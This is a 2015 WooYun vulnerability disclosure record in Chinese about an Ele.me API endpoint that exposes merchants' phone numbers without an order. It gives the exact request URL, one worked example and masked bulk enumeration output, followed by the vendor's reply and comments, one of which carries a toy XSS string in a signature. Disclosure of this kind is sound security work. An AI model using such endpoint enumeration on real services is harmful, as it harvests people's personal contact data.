{"id": 65890, "wybug_id": "wooyun-2015-0137536", "wybug_title": "饿了么某接口可绕过订单权限获取任意商家手机号(可批量/定向)", "wybug_corp": "饿了么", "wybug_author": "DloveJ", "wybug_date": "2015-08-31 14:00", "wybug_open_date": "2015-10-13 14:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 都知道获取商家手机号需要成功下订单才可以，但是一个接口即可绕过直接获取 详细说明：  把标题又改了一遍，新提交了。\nhttp://r.ele.me/restapi/v1/restaurants/hlrgm?extras[]=identification\n \n参数hlrgm是商家name\n \n\n ======================================== 复现过程 收先在主站找一个店！ \n\n 就这个马大姐了 \n\n 点开之后就可以看到商家id \nay-cwlmd\n 然后构造以下链接！ http://r.ele.me/restapi/v1/restaurants/ay-cwlmd?extras[]=identification \n\n 马大姐的手机号就拿到了！\n\nmask 区域\n*****022331&lt*****\n\n用top500用户名跑一下！ \n\n \n\nmask 区域\n*****lse\t2058\t1**********se\t2876\t18**********false\t1974**********lse\t2058\t**********lse\t2039\t**********false\t2394**********se\t1688\t18**********alse\t2606\t1**********alse\t2606\t1**********lse\t1675\t1**********alse\t2037\t**********false\t1604**********false\t1604**********alse\t2809 **********false\t2357**********alse\t3055\t1**********se\t1880\t15**********se\t2321\t15**********se\t2321\t15**********alse\t1730\t**********alse\t1672\t**********alse\t3364 **********lse\t1824\t1**********false\t1736**********se\t1496\t13**********false 1999**********false\t1999**********lse\t1765\t1**********alse\t1575\t**********alse\t1575\t**********false\t1629**********false\t1629**********false\t1917**********lse\t2912\t1**********se\t2655\t13**********false\t2611**********false\t2611**********alse\t1703\t**********alse\t1703 **********alse\t1703\t**********false\t1729**********false\t1710**********lse\t1905\t1**********lse\t1905 1**********se\t2392\t13**********alse\t1592\t**********alse\t1573\t*****\n\n效果还是不错滴   漏洞证明：     修复方案：     版权声明：转载请注明来源 DloveJ@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-08-31 14:41 厂商回复： 感谢对饿了么的关注和支持 最新状态： 2015-10-13：感谢您的报告，经过内部多次沟通交流，现在已将此接口作为了业务需求的功能使用，请知悉。谢谢你对饿了么的关注。稍后我们将会联系你，进行后续礼品发放。  ", "replys": "漏洞评价：\n评论\n     2015-08-31 15:00 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @饿了么 会不会有礼物←_←    \n     2015-08-31 16:47 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:43        | 逆流而上，顺势而为)\t\t \n  F轮融资到位    \n     2015-09-01 13:36 |    \t\t饿了么(乌云厂商)\t\t \n  @DloveJ 有的    \n     2015-09-01 14:09 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @饿了么 我很期待，啦啦啦，是什么啊⊙▽⊙    \n     2015-09-07 18:49 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @饿了么 说好的礼物呢→_→    \n     2015-09-14 17:26 |    \t\t1937nick \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:34        | 水能载舟,亦能煮粥。物尽其用,人尽其能。)\t\t \n  走流程中    \n     2015-10-07 16:20 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:77        | I'm Me_Fortune)\t\t \n  学习。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}